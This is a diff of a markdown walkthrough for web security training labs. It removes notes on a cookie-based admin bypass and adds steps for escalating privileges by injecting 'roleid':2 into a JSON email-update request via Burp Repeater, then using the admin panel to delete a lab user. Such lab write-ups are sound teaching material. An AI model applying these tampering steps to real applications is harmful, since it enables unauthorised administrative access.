@@ -1163,55 +1163,193 @@ carlos
 
 the lab is solved.
 
-# Vulnerability Explanation
 
-The application trusts a client-side cookie:
+![Lab 01](Screenshots/lab3s.png)
 
-```http
-Admin=false
-```
+-------
 
-to determine administrative privileges.
+![Lab 01](Screenshots/lab4a.png)
 
-An attacker can simply modify:
+# Privilege Escalation via User-Controlled Role ID
 
-```http
-Admin=false
-```
+## Step 1: Login
 
-to:
+1. Open the login page.
+2. Login using the credentials supplied by the lab.
 
-```http
-Admin=true
-```
-
-and gain administrator access.
-
-
-## Normal Flow
+Example:
 
 ```text
-User Login
-      ↓
-Admin=false
-      ↓
-No Admin Access
+Username: wiener
+Password: peter
 ```
 
+## Step 2: Open My Account
 
-## Exploited Flow
+Navigate to:
 
 ```text
-User Login
-      ↓
-Admin=true
-      ↓
-Admin Panel Access
-      ↓
-Delete User
+My Account
 ```
 
+You should see the email update functionality.
+
+
+## Step 3: Change Your Email Address
+
+1. Enter any email address.
+
+Example:
+
+```text
+test@test.com
+```
+
+2. Click:
+
+```text
+Update Email
+```
+
+## Step 4: Observe the Response
+
+In Burp Suite, locate the request.
+
+Example:
+
+```http
+POST /my-account/change-email
+```
+
+Response:
+
+```json
+{
+    "username":"wiener",
+    "email":"test@test.com",
+    "roleid":1
+}
+```
+
+Notice:
+
+```text
+roleid = 1
+```
+
+This indicates the application exposes user roles in the API.
+
+
+## Step 5: Send Request to Repeater
+
+1. Right-click the email update request.
+2. Select:
+
+```text
+Send to Repeater
+```
+
+
+## Step 6: Modify the JSON Body
+
+Original:
+
+```json
+{
+    "email":"test@test.com"
+}
+```
+
+Modify to:
+
+```json
+{
+    "email":"test@test.com",
+    "roleid":2
+}
+```
+
+
+## Step 7: Send the Modified Request
+
+Click:
+
+```text
+Send
+```
+
+## Step 8: Verify Role Change
+
+Response:
+
+```json
+{
+    "username":"wiener",
+    "email":"test@test.com",
+    "roleid":2
+}
+```
+
+Observe:
+
+```text
+roleid changed from 1 to 2
+```
+
+This means:
+
+```text
+Administrative privileges granted.
+```
+
+
+## Step 9: Access Admin Panel
+
+Browse to:
+
+```text
+/ admin
+```
+
+Example:
+
+```text
+https://LAB-ID.web-security-academy.net/admin
+```
+
+The admin panel should now load successfully.
+
+
+## Step 10: Delete Carlos
+
+1. Locate:
+
+```text
+carlos
+```
+
+2. Click:
+
+```text
+Delete
+```
+
+or use the delete link.
+
+Example:
+
+```text
+Delete User: carlos
+```
+
+## Step 11: Lab Solved
+
+After deleting:
+
+```text
+carlos
+```
+
+the lab is solved.
+![Lab 01](Screenshots/lab4s.png)
 ---
-
-
-
